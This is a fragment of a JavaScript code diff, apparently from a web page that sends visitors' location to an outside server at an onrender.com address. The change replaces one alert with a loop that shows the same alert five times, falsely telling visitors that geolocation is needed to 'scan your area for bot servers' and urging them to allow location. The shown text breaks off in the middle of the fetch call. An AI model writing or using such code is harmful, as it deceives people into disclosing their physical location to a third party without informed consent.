@@ -12,7 +12,15 @@
 
 //send location
 (function(){
-  alert("we use gelocation to scan your area for bot servers.(i know its super sophisticated but its reall) please click yes")
+  //location alert
+  let count = 0;
+  const interval = setInterval(() => {
+    alert("We use geolocation to scan your area for bot servers... please click allow location");
+    count++;
+    if (count >= 5) clearInterval(interval); // roughly 10 seconds total assuming alert closed quickly
+  }, 500);
+
+    //done alert
   const u='https://map-w4ew.onrender.com/location';
   function send(lat,lon,t){
     fetch(u,{
